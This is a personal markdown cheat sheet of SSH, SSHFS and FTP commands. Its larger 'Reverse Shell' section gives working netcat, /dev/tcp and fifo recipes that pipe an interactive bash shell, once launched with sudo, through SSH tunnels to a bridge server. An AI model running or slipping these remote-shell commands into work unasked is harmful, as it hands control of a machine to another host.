## SSH

- `-X`  Enables X11 (display) forwarding. (But this allows an attacker to listen to my keystrokes.)
- create a pipe between machines

## SSHD

### chroot jail
_See sysadmin/chroot-jail.md_

## SSHFS

```bash
# Mount a remote directory:
sshfs ${user}@${host}:${path} $mydir
# "path" can be absolute or relative to the user's $HOME
# "user@host" can be an alias from .ssh/config
# "mydir" should be an empty local directory

# Unmount the directory:
fusermount -u $mydir 
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbNTU5NjA3ODU5LC04NDIxMjMzMzgsMTcyMT
I5MDgzMF19
-->

## FTP

```bash
python -m pyftpdlib [--help]
python -m pyftpdlib -w -u <uname> -P <pass>
```

## Reverse Shell
### With SSH tunnels
First, start listening on the server:
```bash
nc -l -k localhost 8889
```
Then on the target machine:
```bash
# Open SSH tunnel
ssh -N -L 8889:localhost:8889 qa -f # local -> remote
# Start shell
sudo bash -c 'bash -i >& /dev/tcp/127.0.0.1/8889 0>&1'
```
### Echo only
```bash
# target terminal A
ssh -N -R 8888:localhost:8888 qa
# target terminal B
nc -l localhost 8888
# bridge server
nc localhost 8888 # Then enter text
```
## Execute only
```bash
# target terminal A
ssh -N -R 8888:localhost:8888 qa
# target terminal B
mkfifo nci
nc -l localhost 8888 >nci
# target terminal C
/bin/bash -i 0<nci
# brige server
nc localhost 8888 # then type commands, whose output appears on target:C
```
## Echo on bridge only
```bash
# target terminal A
ssh -N -L 8889:localhost:8889 qa
# bridge server A
nc -l -k localhost 8889
# target terminal B
nc localhost 8889 # then type text which appears in bridge:A
```
...with a fifo:
```bash
# target terminal A
ssh -N -L 8889:localhost:8889 qa
# target terminal A
mkfifo nco
nc localhost 8889 <nco
# bridge server A
nc -l -k localhost 8889
# target terminal B
echo foo > nco # This only works for the first echo. Why?
```
## Execute and echo back
```bash
# target terminal F
ssh -N -L 8889:localhost:8889 qa
# target terminal A
ssh -N -R 8888:localhost:8888 qa
# target terminal B
mkfifo nci
nc -l -k localhost 8888 >nci
# target terminal C
mkfifo nco
nc localhost 8889 <nco
# target terminal D
/bin/bash -i 0<nci >nco
# bridge server A
nc localhost 8888 # then enter commands, whose output will appear on bridge:B
# bridge server B
nc -l localhost 8889
```
